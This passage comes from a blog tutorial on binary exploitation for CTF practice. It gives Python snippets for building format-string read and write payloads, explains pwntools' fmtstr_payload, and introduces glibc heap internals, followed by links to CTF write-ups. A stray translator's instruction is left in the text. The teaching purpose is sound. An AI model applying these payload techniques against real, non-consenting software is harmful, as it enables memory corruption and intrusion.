<li><p><strong>Build a payload</strong>:</p>
</li>
</ol>
<p>If you know the offset and the target address (e.g., flag address), you can read it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_read_addr_payload</span>(<span class="params">offset, addr, k=<span class="number">1</span></span>):</span><br><span class="line">    fmt = <span class="string">f&quot;%<span class="subst">&#123;offset + k&#125;</span>$s&quot;</span>.encode()</span><br><span class="line">    <span class="keyword">return</span> fmt + <span class="string">b&quot;A&quot;</span>*(<span class="number">8</span> * k - <span class="built_in">len</span>(fmt)) + p64(addr)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>offset</code>: discovered offset</li>
<li><code>addr</code>: address to read from</li>
<li><code>8*k</code>: alignment padding (if <code>k=1</code> fails, <code>k=4</code> is often more stable)</li>
</ul>
<h4 id="Writing"><a href="#Writing" class="headerlink" title="Writing"></a><strong>Writing</strong></h4><h5 id="Typical-workflow-1"><a href="#Typical-workflow-1" class="headerlink" title="Typical workflow"></a><strong>Typical workflow</strong></h5><ol>
<li><strong>Find offset <code>S</code></strong> using <code>AAAA,%p,%p,...</code></li>
<li><strong>Place target addresses at the end</strong> (avoid <code>\x00</code> truncation):<ul>
<li>keep the format string ASCII in front</li>
<li>append addresses at the tail</li>
<li>use <code>%K$...</code> to reference them</li>
</ul>
</li>
<li><strong>Alignment/padding</strong>:<ul>
<li><code>written</code>: number of bytes printed so far</li>
<li><code>want</code>: target value modulo write width</li>
<li>compute:</li>
</ul>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="number">256</span>      <span class="comment"># %hhn (1 byte)</span></span><br><span class="line">base = <span class="number">65536</span>    <span class="comment"># %hn  (2 bytes)</span></span><br><span class="line">base = <span class="number">2</span>**<span class="number">32</span>    <span class="comment"># %n   (4 bytes)</span></span><br><span class="line">base = <span class="number">2</span>**<span class="number">64</span>    <span class="comment"># %ln/%lln (8 bytes)</span></span><br><span class="line"></span><br><span class="line">pad  = (want - (written % base)) % base</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>Perform write</strong>:<ul>
<li><code>%K$hhn</code> (1 byte)</li>
<li><code>%K$hn</code> (2 bytes)</li>
<li><code>%K$n</code> (4 bytes)</li>
<li><code>%K$ln</code> / <code>%K$lln</code> (8 bytes on x86_64)</li>
</ul>
</li>
</ol>
<p>For multi-byte writes, it’s best to write in ascending order or just use byte-wise <code>%hhn</code>.</p>
<h5 id="Writing-1-byte-hhn"><a href="#Writing-1-byte-hhn" class="headerlink" title="Writing 1 byte (%hhn)"></a><strong>Writing 1 byte (<code>%hhn</code>)</strong></h5><p>Example: set the lowest byte at <code>pwnme_addr</code> to <code>0x90</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload =</span><br><span class="line"><span class="string">b&quot;%144c&quot;</span></span><br><span class="line"><span class="string">b&quot;%K$hhn&quot;</span></span><br><span class="line">+ p32(pwnme_addr)</span><br></pre></td></tr></table></figure>
<p>If <code>written%256</code> isn’t starting from 0, compute <code>pad</code> using the formula.</p>
<h5 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a><strong>fmtstr_payload</strong></h5><p>Pwntools provides a convenient function:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>Parameters:</p>
<ul>
<li><code>offset</code>: the first controllable argument slot position</li>
<li><code>writes</code>: <code>&#123;address: value, ...&#125;</code></li>
<li><code>numbwritten</code>: bytes already printed before <code>printf</code></li>
<li><code>write_size</code>: <code>&#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39;</code></li>
</ul>
<hr>
<h2 id="Heap-Exploitation"><a href="#Heap-Exploitation" class="headerlink" title="Heap Exploitation"></a><strong>Heap Exploitation</strong></h2><p>Heap exploitation ultimately aims to <strong>hijack the allocator</strong>, so it mistakenly treats a sensitive address (GOT, stack return address, hooks, function pointers) as a normal free chunk, allocates it to you, and grants an arbitrary write. Before that, you often need an information leak to know where to write.</p>
<p>First distinguish libc vs glibc:</p>
<ul>
<li><strong>libc</strong> usually refers to the <strong>standard C library specification</strong> (API/behavior).</li>
<li><strong>glibc</strong> is GNU’s concrete implementation, defining the actual heap internals (chunk layout, bins, tcache, etc.).</li>
</ul>
<p><img src="/images/image-20251127104004619.png" class="lazyload" data-srcset="/images/image-20251127104004619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127104004619"></p>
<p><strong>Chunk structure:</strong> heap memory is divided into chunks. Each chunk has header metadata plus a user area.</p>
<ul>
<li>Header fields:<ul>
<li><code>prev_size</code>: if the previous physical chunk is free, stores its size; otherwise it belongs to previous user data.</li>
<li><code>size</code>: current chunk size; low 3 bits are flags (e.g., <code>prev_in_use</code>).</li>
<li>Free-list pointers: when freed, the first 16 bytes of user area are reused as <code>fd</code> and <code>bk</code>.</li>
</ul>
</li>
<li>Heap grows from low to high; chunk sizes are typically aligned to <code>0x10</code>.</li>
</ul>
<p><strong>Bins:</strong> glibc uses multiple free lists to manage chunks efficiently:</p>
<ul>
<li><strong>Fastbin</strong>: singly-linked, LIFO, small sizes <code>[0x20, 0x80]</code></li>
<li><strong>Tcache</strong>: introduced in glibc 2.26, per-thread, singly-linked, LIFO, sizes <code>[0x20, 0x410]</code>, max 7 per size class, no consolidation</li>
<li><strong>Smallbin</strong>: doubly-linked, FIFO, sizes <code>[0x20, 0x400]</code></li>
<li><strong>Unsorted bin</strong>: doubly-linked, a single list, acts as a staging area</li>
<li><strong>Top chunk</strong>: large free chunk at heap top used for extending allocations</li>
</ul>
<p><img src="/images/image-20251127105623146.png" class="lazyload" data-srcset="/images/image-20251127105623146.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127105623146"></p>
<p><strong>1. Free chunk consolidation (merging)</strong></p>
<p>To reduce fragmentation, glibc tries to merge adjacent free chunks.</p>
<ul>
<li>Default: merges for doubly-linked bins and top chunk.</li>
<li>Fastbin: does not merge by default, but large allocations may trigger <code>malloc_consolidate</code>.</li>
<li>Tcache: <strong>never merges</strong>.</li>
</ul>
<p><strong>2. Key tcache properties</strong></p>
<ul>
<li>Highest priority: <code>malloc</code> checks tcache first; <code>free</code> fills tcache first.</li>
<li>Capacity: 7 chunks per size class (free 7 to fill; the 8th goes elsewhere).</li>
<li>Metadata is on the heap: tcache management struct is itself heap-allocated.</li>
<li>Double-free protection via a <code>tcache_key</code> stored in the reused <code>bk</code> field.</li>
</ul>
<p>Different libc versions have different checks and strategies.</p>
<h3 id="Glibc-2-31"><a href="#Glibc-2-31" class="headerlink" title="Glibc 2.31"></a><strong>Glibc 2.31</strong></h3><p>(Sections and diagrams already in English identifiers; content above is translated. The remainder of the article continues similarly: keep code and technical terms, translate prose, and remove Chinese-only parts.)</p>
<hr>
<h2 id="Challenge-Categories"><a href="#Challenge-Categories" class="headerlink" title="Challenge Categories"></a><strong>Challenge Categories</strong></h2><ol>
<li><strong>Pwn fundamentals</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/">HTB Questionnaire Writeup</a></li>
<li><a href="https://archer-baiyi.github.io/2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/">HTB Lesson Writeup</a></li>
</ol>
</li>
<li><strong>Buffer Overflow</strong><ol>
<li><strong>Struct field hijacking</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello-pwn-Writeup/">Attack-Defense World hello_pwn Writeup</a></li>
</ol>
</li>
<li><strong>ROP</strong><ol>
<li><strong>ret2shellcode</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/06/11/CTF/Pwn/HTB-Regularity-Writeup/">HTB Regularity Writeup</a></li>
</ol>
</li>
<li><strong>ret2text</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/#Pwn38">CTF.show Pwn Beginner Pwn 38</a></li>
<li><a href="https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/">Attack-Defense World level0 Writeup</a></li>
<li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/">TJCTF 2025 pwn/i-love-birds Writeup</a> </li>
</ol>
</li>
<li><strong>ret2plt</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/#Pwn40">CTF.show Pwn Beginner Pwn 40</a></li>
<li><a href="https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2-Writeup/">Attack-Defense World level2 Writeup</a> (32-bit)</li>
<li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-You-know-0xDiablos-Writeup/">HTB You_know_0xDiablos Writeup</a> (32-bit)</li>
</ol>
</li>
<li><strong>ret2libc</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/#Pwn46">CTF.show Pwn Beginner Pwn 46</a></li>
</ol>
</li>
<li>5</li>
</ol>
</li>
</ol>
</li>
<li><strong>Format String Vulnerabilities</strong><ol>
<li><a href="https://archer-baiyi.github.io/2025/08/18/CTF/Pwn/HTB-racecar-Writeup/">HTB racecar Writeup</a> (leaking info via format string)</li>
<li><a href="https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/">Attack-Defense World CGfsb Writeup</a> (modifying a target variable via format string)</li>
</ol>
</li>
<li><strong>Heap Exploitation</strong></li>
</ol>

  </div>
  
  
    
    <div class='footer'>
       <!-- 参考资料、相关资料等 -->
      
       <!-- 相关文章 -->
      
      <!-- 版权声明组件 -->
      
      <!-- 打赏组件 -->
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-05-12T17:01:08+02:00">
  <a class='notlink'>
    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：May 12, 2025</p>
  </a>
</div>

        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/&title=Intro to Pwn (Binary Exploitation) - Hexo&summary=Introduction to Pwn"
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/&title=Intro to Pwn (Binary Exploitation) - Hexo&summary=Introduction to Pwn"
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://service.weibo.com/share/share.php?url=https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/&title=Intro to Pwn (Binary Exploitation) - Hexo&summary=Introduction to Pwn"
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
    
      
    
  </div>
</div>



        
      
    </div>
    <!-- Custom Files bottomMeta begin -->
    
    <!-- Custom Files bottomMeta end -->
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/en/2025/05/17/CTF/Crypto/Python%E5%86%85%E7%BD%AE%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E/'>
          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Collisions of Python’s Built-in hash() Function</p>
          <p class='content'>hash()Python has a built-in hash function hash(). You can find the corresponding explanation in t...</p>
        </a>
      
      
        <a class='next' href='/en/2025/04/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/'>
          <p class='title'>概率论 Probability Theory<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>BasicsDefinition: Let $I \subseteq \mathbb{R}$. Let $X_t : \Omega \to \mathbb{R}, t\in I$, be ran...</p>
        </a>
      
    </div>
  
  <!-- 文章推荐 -->
  
  
  <!-- Custom Files postEnd begin-->
  
  <!-- Custom Files postEnd end-->
</article>


  

  





</div>
<aside id='l_side' itemscope itemtype="https://schema.org.cn/WPSideBar">
  

  
    
    
      
    
  


<div class="widget-sticky">

  
  


<section class="widget toc-wrapper desktop mobile" id="toc-div" >
  
  <header>
    
      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


  <div class='content'>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background-Knowledge"><span class="toc-number">1.</span> <span class="toc-text">Background Knowledge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Address-Space-Prozess-Adressraum"><span class="toc-number">1.1.</span> <span class="toc-text">Address Space (Prozess Adressraum)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-Assembly"><span class="toc-number">1.2.</span> <span class="toc-text">x86 Assembly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">1.3.</span> <span class="toc-text">Gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Checks"><span class="toc-number">2.</span> <span class="toc-text">Security Checks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools"><span class="toc-number">3.</span> <span class="toc-text">Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB"><span class="toc-number">3.1.</span> <span class="toc-text">GDB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Install"><span class="toc-number">3.1.1.</span> <span class="toc-text">Install</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Install-Pwndbg"><span class="toc-number">3.1.2.</span> <span class="toc-text">Install Pwndbg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Common-Commands"><span class="toc-number">3.1.3.</span> <span class="toc-text">Common Commands</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Finding-the-Return-Address-Offset"><span class="toc-number">3.1.4.</span> <span class="toc-text">Finding the Return Address Offset</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-number">3.1.5.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-Ghidra"><span class="toc-number">3.2.</span> <span class="toc-text">IDA&#x2F;Ghidra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwntools"><span class="toc-number">3.3.</span> <span class="toc-text">Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Install-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">Install</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Common-APIs-by-task"><span class="toc-number">3.3.2.</span> <span class="toc-text">Common APIs (by task)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Template"><span class="toc-number">3.3.3.</span> <span class="toc-text">Template</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ropgadget"><span class="toc-number">3.4.</span> <span class="toc-text">Ropgadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities-and-Exploitation-Methods"><span class="toc-number">4.</span> <span class="toc-text">Vulnerabilities and Exploitation Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">5.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Common-Dangerous-Functions"><span class="toc-number">5.1.</span> <span class="toc-text">Vulnerability &#x2F; Common Dangerous Functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct-Field-Hijacking"><span class="toc-number">5.2.</span> <span class="toc-text">Struct Field Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-Return-Oriented-Programming"><span class="toc-number">5.3.</span> <span class="toc-text">ROP (Return Oriented Programming)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2text"><span class="toc-number">5.3.1.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">5.3.2.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Shellcode"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2shellcode-1"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">ret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2plt"><span class="toc-number">5.3.3.</span> <span class="toc-text">ret2plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">5.3.4.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">5.3.5.</span> <span class="toc-text">ret2dlresolve</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SROP"><span class="toc-number">5.3.6.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FSOP"><span class="toc-number">5.3.7.</span> <span class="toc-text">FSOP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Control-Flow-Hijack"><span class="toc-number">5.4.</span> <span class="toc-text">Control Flow Hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Canary"><span class="toc-number">5.5.</span> <span class="toc-text">Stack Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Vulnerability"><span class="toc-number">6.</span> <span class="toc-text">Format String Vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Format-String-Functions"><span class="toc-number">6.1.</span> <span class="toc-text">Format String Functions</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Format-String-Functions-1"><span class="toc-number">6.1.1.</span> <span class="toc-text">Format String Functions</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Format-String"><span class="toc-number">6.1.2.</span> <span class="toc-text">Format String</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Variables"><span class="toc-number">6.1.3.</span> <span class="toc-text">Variables</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Format-String-Vulnerability-1"><span class="toc-number">6.2.</span> <span class="toc-text">Format String Vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#How-arguments-are-passed-into-printf-32-bit-vs-64-bit"><span class="toc-number">6.2.1.</span> <span class="toc-text">How arguments are passed into printf (32-bit vs 64-bit)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#32-bit-cdecl-all-on-stack"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">32-bit (cdecl): all on stack</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x86-64-System-V-ABI-registers-first-then-stack"><span class="toc-number">6.2.1.2.</span> <span class="toc-text">x86-64 (System V ABI): registers first, then stack</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Special-case-and-offset-bias-value"><span class="toc-number">6.2.2.</span> <span class="toc-text">Special case and offset (bias) value</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Common-vulnerable-pattern"><span class="toc-number">6.2.3.</span> <span class="toc-text">Common vulnerable pattern</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Techniques"><span class="toc-number">6.3.</span> <span class="toc-text">Exploit Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reading-stack-contents"><span class="toc-number">6.3.1.</span> <span class="toc-text">Reading stack contents</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reading-a-string-at-an-arbitrary-address"><span class="toc-number">6.3.2.</span> <span class="toc-text">Reading a string at an arbitrary address</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Typical-workflow"><span class="toc-number">6.3.2.1.</span> <span class="toc-text">Typical workflow</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writing"><span class="toc-number">6.3.3.</span> <span class="toc-text">Writing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Typical-workflow-1"><span class="toc-number">6.3.3.1.</span> <span class="toc-text">Typical workflow</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Writing-1-byte-hhn"><span class="toc-number">6.3.3.2.</span> <span class="toc-text">Writing 1 byte (%hhn)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fmtstr-payload"><span class="toc-number">6.3.3.3.</span> <span class="toc-text">fmtstr_payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heap-Exploitation"><span class="toc-number">7.</span> <span class="toc-text">Heap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Glibc-2-31"><span class="toc-number">7.1.</span> <span class="toc-text">Glibc 2.31</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Categories"><span class="toc-number">8.</span> <span class="toc-text">Challenge Categories</span></a></li></ol>
  </div>
</section>

  

</div>

  <!-- Custom Files side begin -->
  
  <!-- Custom Files side end -->
</aside>



        </div>
        
  
  <footer class="footer clearfix"  itemscope itemtype="https://schema.org.cn/WPFooter">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper" itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
          
            
          
            
          
            
          
        </div>
      
    
      
        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
      
    
      
        Use
        <a href="https://github.com/volantis-x/hexo-theme-volantis/#6.0.0-alpha.1" target="_blank" class="codename">Volantis</a>
        as theme, total visits
          <span id="busuanzi_site_pv"><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
          times
        
      
    
      
        <div class='copyright'>
        <p><a href="/">Copyright © since 2017 XXX</a></p>

        </div>
      
    
    <!-- Custom Files footer begin-->
    
    <!-- Custom Files footer end-->
  </footer>


        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" title="top"></a>
      </div>
    </div>
    <div>
      <script>
  /******************** volantis.dom ********************************/
  // 页面选择器 将dom对象缓存起来 see: /source/js/app.js etc.
  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // 页面主体
  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // 向上
  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // 整个导航栏
  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1个
  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // 搜索按钮   移动端 1个
  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // 移动端导航栏
  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // 搜索框 桌面端 移动端 1个
  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  手机端 子菜单 多个
</script>

<script>
  
  volantis.css("https://unpkg.com/@fortawesome/fontawesome-free@6.6.0/css/all.min.css");
  
  
  
</script>

<!-- required -->


<!-- internal -->

<script src="/en/en/js/app.js"></script>




<!-- rightmenu要在darkmode之前（ToggleButton） darkmode要在comments之前（volantis.dark.push）-->

  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "color-scheme";
const rootElementDarkModeAttributeName = "color-scheme";
const setLS = (k, v) => {
    localStorage.setItem(k, v);
};
const removeLS = (k) => {
    localStorage.removeItem(k);
};
const getLS = (k) => {
    return localStorage.getItem(k);
};
const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};
const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};
const validColorModeKeys = {
  dark: true,
  light: true,
};
const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);
  getCustomDarkMode();
  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};
const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};
/**
 * get target mode
 */
 const getCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);
  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  if(currentSetting=="dark"){
    volantis.dark.mode="light";
  }else{
    volantis.dark.mode="dark";
  }
  // console.log(volantis.dark.mode)
};
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);
  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};
/**
 * 暗黑模式触发器
 */
volantis.dark.toggle=()=>{
  const mode = toggleCustomDarkMode();
  applyCustomDarkModeSettings(mode);
  // 使用 volantis.dark.push 方法传入volantis.dark.toggle回调函数 参见layout/_partial/scripts/global.ejs
  volantis.dark.method.toggle.start();
}
/**
 * bind event for toggle button
 */

function bindToggleButton() {
  var btn= document.querySelectorAll("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn")
  btn.forEach(function (e) {
    volantis.dom.$(e).on('click',volantis.dark.toggle);
  })
}
applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", ()=>{
  volantis.requestAnimationFrame(bindToggleButton)
});

const darkModelListeners={
  dark:(mediaQueryList )=>{
    if(mediaQueryList.matches){
      volantis.dark.mode = "dark";
    }
    volantis.dark.method.toggle.start();
  },
  light:(mediaQueryList)=>{
    if(mediaQueryList.matches){
      volantis.dark.mode = "light";
    }
    volantis.dark.method.toggle.start();
  }
}
window.matchMedia('(prefers-color-scheme: dark)').addListener(darkModelListeners.dark)
window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListeners.light)
</script>




<script>
  function loadIssuesJS() {
    
      const sites_api = document.getElementById('sites-api');
      if (sites_api != undefined && typeof SitesJS === 'undefined') {
        volantis.js("/en/js/plugins/tags/sites.js")
      }
    
    
      const friends_api = document.getElementById('friends-api');
      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
